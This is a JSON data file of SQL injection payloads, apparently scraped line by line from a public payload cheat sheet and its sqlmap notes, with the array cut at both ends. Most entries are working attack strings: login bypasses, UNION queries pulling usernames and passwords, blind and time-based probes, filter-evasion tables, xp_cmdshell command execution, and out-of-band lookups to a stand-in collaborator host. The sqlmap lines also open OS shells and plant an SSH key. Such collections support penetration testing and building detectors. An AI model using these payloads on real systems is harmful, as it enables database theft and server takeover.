    "payload": "' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM  (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#",
    "category": "sql injection",
    "source_file": "BigQuery Injection.md"
  },
  {
    "payload": "| SQL Query                                                | Description          |",
    "category": "sql injection",
    "source_file": "BigQuery Injection.md"
  },
  {
    "payload": "| -------------------------------------------------------- | -------------------- |",
    "category": "sql injection",
    "source_file": "BigQuery Injection.md"
  },
  {
    "payload": "| `' OR if(1/(length((select('a')))-1)=1,true,false) OR '` | Division by zero     |",
    "category": "sql injection",
    "source_file": "BigQuery Injection.md"
  },
  {
    "payload": "| `select CAST(@@project_id AS INT64)`                     | Casting              |",
    "category": "sql injection",
    "source_file": "BigQuery Injection.md"
  },
  {
    "payload": "' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#",
    "category": "sql injection",
    "source_file": "BigQuery Injection.md"
  },
  {
    "payload": "      '||'DERP\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "      '+'herp\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "      ' 'DERP\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "      '%20'HERP\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "      '%2B'HERP\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "      page.asp?id=1' or 1=1 -- true\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "      page.asp?id=1\" or 1=1 -- true\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "SELECT * FROM users WHERE username = 'user' AND password = 'pass';\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "' OR '1'='1\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "' or 1=1 limit 1 --\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "sql = \"SELECT * FROM admin WHERE pass = '\".md5($password,true).\"'\";\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "sql1 = \"SELECT * FROM admin WHERE pass = '\".md5(\"ffifdyop\", true).\"'\";\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "sql1 = \"SELECT * FROM admin WHERE pass = ''or'6\ufffd]\ufffd\ufffd!r,\ufffd\ufffdb\u001c'\";\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "SELECT product_name, product_price FROM products WHERE product_id = 'input_id';\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "1' UNION SELECT username, password FROM users --\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "ERROR: invalid input syntax for type numeric: \"PostgreSQL 9.5.25 on x86_64-pc-linux-gnu\"\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) > 64 -- \n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "' AND SLEEP(5)/*\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "' AND '1'='1' AND SLEEP(5)\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "' ; WAITFOR DELAY '00:00:05' --\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "  LOAD_FILE('\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a')\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "  SELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "  SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "  exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "1; EXEC xp_cmdshell('whoami') --\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "' union select 0x2720756e696f6e2073656c65637420312c3223#\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "username=\"anything' UNION SELECT Username, Password FROM Users;--\"\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "password=\"P@ssw0rd\"\n",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "> SQL Injection (SQLi)  is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. SQL Injection is one of the most common and severe types of web application vulnerabilities, enabling attackers to execute arbitrary SQL code on the database. This can lead to unauthorized data access, data manipulation, and, in some cases, full compromise of the database server.",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "* **Error Messages**: Inputting special characters (e.g., a single quote ') into input fields might trigger SQL errors. If the application displays detailed error messages, it can indicate a potential SQL injection point.",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "* Simple characters: `'`, `\"`, `;`, `)` and `*",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "* MODIFIER LETTER PRIME (`U+02B9` encoded as `%CA%B9`) is transformed into `U+0027` APOSTROPHE (')",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "* **Tautology-Based SQL Injection**: By inputting tautological (always true) conditions, you can test for vulnerabilities. For instance, entering `admin' OR '1'='1` in a username field might log you in as the admin if the system is vulnerable.",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "'||'DERP",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "'+'herp",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "' 'DERP",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "'%20'HERP",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "'%2B'HERP",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "page.asp?id=1' or 1=1 -- true",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "page.asp?id=1\" or 1=1 -- true",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| DBMS                | SQL Payload                     |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| ------------------- | ------------------------------- |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| MySQL               | `conv('a',16,2)=conv('a',16,2)` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| MySQL               | `connection_id()=connection_id()` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| MySQL               | `crc32('MySQL')=crc32('MySQL')` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| MSSQL               | `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| MSSQL               | `@@CONNECTIONS>0` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| MSSQL               | `@@CONNECTIONS=@@CONNECTIONS` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| MSSQL               | `@@CPU_BUSY=@@CPU_BUSY` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| MSSQL               | `USER_ID(1)=USER_ID(1)` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| ORACLE              | `ROWNUM=ROWNUM` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| ORACLE              | `RAWTOHEX('AB')=RAWTOHEX('AB')` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| ORACLE              | `LNNVL(0=123)` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| POSTGRESQL          | `5::int=5` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| POSTGRESQL          | `5::integer=5` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| POSTGRESQL          | `pg_client_encoding()=pg_client_encoding()` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| POSTGRESQL          | `get_current_ts_config()=get_current_ts_config()` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| POSTGRESQL          | `quote_literal(42.5)=quote_literal(42.5)` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| POSTGRESQL          | `current_database()=current_database()` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| SQLITE              | `sqlite_version()=sqlite_version()` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| SQLITE              | `last_insert_rowid()>1` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| SQLITE              | `last_insert_rowid()=last_insert_rowid()` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| MSACCESS            | `val(cvar(1))=1` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| MSACCESS            | `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| DBMS                | Example Error Message                                                                    | Example Payload |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| ------------------- | -----------------------------------------------------------------------------------------|-----------------|",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| MySQL               | `You have an error in your SQL syntax; ... near '' at line 1`                            | `'`             |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| PostgreSQL          | `ERROR: unterminated quoted string at or near \"'\"`                                       | `'`             |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| PostgreSQL          | `ERROR: syntax error at or near \"1\"`                                                     | `1'`            |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| Microsoft SQL Server| `Unclosed quotation mark after the character string ''.`                                 | `'`             |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| Microsoft SQL Server| `Incorrect syntax near ''.`                                                              | `'`             |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| Microsoft SQL Server| `The conversion of the varchar value to data type int resulted in an out-of-range value.`| `1'`            |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| Oracle              | `ORA-00933: SQL command not properly ended`                                              | `'`             |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| Oracle              | `ORA-01756: quoted string not properly terminated`                                       | `'`             |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| Oracle              | `ORA-00923: FROM keyword not found where expected`                                       | `1'`            |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "SELECT * FROM users WHERE username = 'user' AND password = 'pass';",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "' OR '1'='1",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "Here, `'1'='1'` is always true, which means the query could return a valid user, effectively bypassing the authentication check.",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "' or 1=1 limit 1 ",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "In PHP, if the optional `binary` parameter is set to true, then the `md5` digest is instead returned in raw binary format with a length of 16. Let's take this PHP code where the authentication is checking the MD5 hash of the password submitted by the user.",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "sql = \"SELECT * FROM admin WHERE pass = '\".md5($password,true).\"'\";",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "An attacker can craft a payload where the result of the `md5($password,true)` function will contain a quote and escape the SQL context, for example with `' or 'SOMETHING`.",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| Hash | Input    | Output (Raw)            |  Payload  |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| ---- | -------- | ----------------------- | --------- |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| md5  | ffifdyop | `'or'6\ufffd]\ufffd\ufffd!r,\ufffd\ufffdb`       | `'or'`    |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| md5  | 129581926211651571912466741651878684928 | `\u00daT0D\u009f\u008fo#\u00df\u00c1'or'8` | `'or'` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| sha1 | 3fDf     | `Q\ufffdu'='\ufffd@\ufffd[\ufffdt\ufffd- o\ufffd\ufffd_-!` | `'='`     |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| sha1 | 178374   | `\u0099\u00dc\u00db\u00be}_i\u0099\u009ba!8Wm'/*\u00b4\u00d5`      | `'/*`     |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| sha1 | 17       | `\u00d9p2\u00fbjww\u0099%6\\`            | `\\`       |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "sql1 = \"SELECT * FROM admin WHERE pass = '\".md5(\"ffifdyop\", true).\"'\";",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "sql1 = \"SELECT * FROM admin WHERE pass = ''or'6\ufffd]\ufffd\ufffd!r,\ufffd\ufffdb\u001c'\";",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "Let's assume a vulnerable web application retrieves product details based on a product ID from a database:",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "SELECT product_name, product_price FROM products WHERE product_id = 'input_id';",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "1' UNION SELECT username, password FROM users ",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "ERROR: invalid input syntax for type numeric: \"PostgreSQL 9.5.25 on x86_64-pc-linux-gnu\"",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "Blind SQL Injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the application's response.",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) > 64 ",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "Attacks rely on sending an SQL query to the database, making the application return a different result depending on whether the query returned successfully or triggered an error. In this case, we only infer the success from the server's answer, but the data is not extracted from output of the error.",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "' AND SLEEP(5)/*",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "' AND '1'='1' AND SLEEP(5)",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "' ; WAITFOR DELAY '00:00:05' ",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "Let's see a basic example to recover the version of the database using a time based sql injection.",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) ",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "If the server's response is taking a few seconds before getting received, then the version is starting is by '5'.",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "Out-of-Band SQL Injection (OOB SQLi) occurs when an attacker uses alternative communication channels to exfiltrate data from a database. Unlike traditional SQL injection techniques that rely on immediate responses within the HTTP response, OOB SQL injection depends on the database server's ability to make network connections to an attacker-controlled server. This method is particularly useful when the injected SQL command's results cannot be seen directly or the server's responses are not stable or reliable.",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "LOAD_FILE('\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a')",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "SELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "Stacked Queries SQL Injection is a technique where multiple SQL statements are executed in a single query, separated by a delimiter such as a semicolon (`;`). This allows an attacker to execute additional malicious SQL commands following a legitimate query. Not all databases or application configurations support stacked queries.",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "1; EXEC xp_cmdshell('whoami') ",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "> Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output. - Zenodermus Javanicus",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "In short, the result of the first SQL query is used to build the second SQL query. The usual format is `' union select 0xHEXVALUE --` where the HEX is the SQL injection for the second query.",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "0x2720756e696f6e2073656c65637420312c3223` is the hex encoded of `' union select 1,2#",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "' union select 0x2720756e696f6e2073656c65637420312c3223#",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061` is the hex encoded of `-1' union select login,password from users-- a`.",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "Second Order SQL Injection is a subtype of SQL injection where the malicious SQL payload is primarily stored in the application's database and later executed by a different functionality of the same application.",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "username=\"anything' UNION SELECT Username, Password FROM Users;--\"",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "password=\"P@ssw0rd\"",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| Bypass                   | Technique              |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| ------------------------ | ---------------------- |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `?id=1%09and%091=1%09--` | Whitespace alternative |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `?id=1%0Aand%0A1=1%0A--` | Whitespace alternative |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `?id=1%0Band%0B1=1%0B--` | Whitespace alternative |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `?id=1%0Cand%0C1=1%0C--` | Whitespace alternative |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `?id=1%0Dand%0D1=1%0D--` | Whitespace alternative |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `?id=1%A0and%A01=1%A0--` | Whitespace alternative |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| DBMS       | ASCII characters in hexadecimal |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| ---------- | ------------------------------- |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| SQLite3    | 0A, 0D, 0C, 09, 20 |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| MySQL 5    | 09, 0A, 0B, 0C, 0D, A0, 20 |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| MySQL 3    | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| PostgreSQL | 0A, 0D, 0C, 09, 20 |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| Oracle 11g | 00, 0A, 0D, 0C, 09, 20 |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| MSSQL      | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| Bypass                                    | Technique            |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| ----------------------------------------- | -------------------- |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `?id=1/*comment*/AND/**/1=1/**/--`        | Comment              |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `?id=1/*!12345UNION*//*!12345SELECT*/1--` | Conditional comment  |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `?id=(1)and(1)=(1)--`                     | Parenthesis          |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| Forbidden           | Bypass |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| ------------------- | ------ |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `LIMIT 0,1`         | `LIMIT 1 OFFSET 0` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `SUBSTR('SQL',1,1)` | `SUBSTR('SQL' FROM 1 FOR 1)` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `SELECT 1,2,3,4`    | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| Bypass    | SQL Example |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| --------- | ------------------------------------------ |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `LIKE`    | `SUBSTRING(VERSION(),1,1)LIKE(5)`          |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `NOT IN`  | `SUBSTRING(VERSION(),1,1)NOT IN(4,3)`      |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `IN`      | `SUBSTRING(VERSION(),1,1)IN(4,3)`          |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `BETWEEN` | `SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| Bypass    | Technique  |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| --------- | ---------- |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `AND`     | Uppercase  |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `and`     | Lowercase  |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `aNd`     | Mixed case |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| Forbidden | Bypass                      |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| --------- | --------------------------- |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `AND`     | `&&`                        |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `OR`      | `\\|\\|`                      |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `=`       | `LIKE`, `REGEXP`, `BETWEEN` |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `>`       | `NOT BETWEEN 0 AND X`       |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "| `WHERE`   | `HAVING`                    |",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "* [PentestMonkey's mySQL injection cheat sheet - @pentestmonkey - August 15, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)",
    "category": "sql injection",
    "source_file": "README.md"
  },
  {
    "payload": "sqlmap --url=\"<url>\" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://example.com\" --data \"username=admin&password=pass\"  --headers=\"x-forwarded-for:127.0.0.1*\"\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -r /tmp/r.txt --dbms MySQL --second-order \"http://targetapp/wishlist\" -v 3\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -r 1.txt -dbms MySQL -second-order \"http://<IP/domain>/joomla/administrator/index.php\" -D \"joomla\" -dbs\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "    sqlmap -u \"http://example.com/?id=1\"  -p id --sql-shell\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "    sqlmap -u \"http://example.com/?id=1\"  -p id --os-shell\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "    sqlmap -u \"http://example.com/?id=1\"  -p id --os-pwn\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "    sqlmap -u \"http://example.com/?id=1\" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://example.com/\" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://www.target.com\" --proxy=\"http://127.0.0.1:8080\"\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://www.target.com/page.php?id=1\" --proxy=\"http://127.0.0.1:8080\" --proxy-cred=\"user:pass\"\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "    --proxy=\"http://[username]:[password]@[proxy_ip]:[proxy_port]\"\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "    --proxy=\"http://user:pass@127.0.0.1:8080\"\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "    --proxy=\"socks4://[username]:[password]@[proxy_ip]:[proxy_port]\"\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "    --proxy=\"socks4://user:pass@127.0.0.1:1080\"\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "    --proxy=\"socks5://[username]:[password]@[proxy_ip]:[proxy_port]\"\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "    --proxy=\"socks5://user:pass@127.0.0.1:1080\"\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://example.com/?id=1\"  -p id --suffix=\"-- \"\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
    "payload": "sqlmap -u \"http://targetwebsite.com/vulnerablepage.php?id=1\" --tamper=<tamper-script-name>\n",
    "category": "sql injection",
    "source_file": "SQLmap.md"
  },
  {
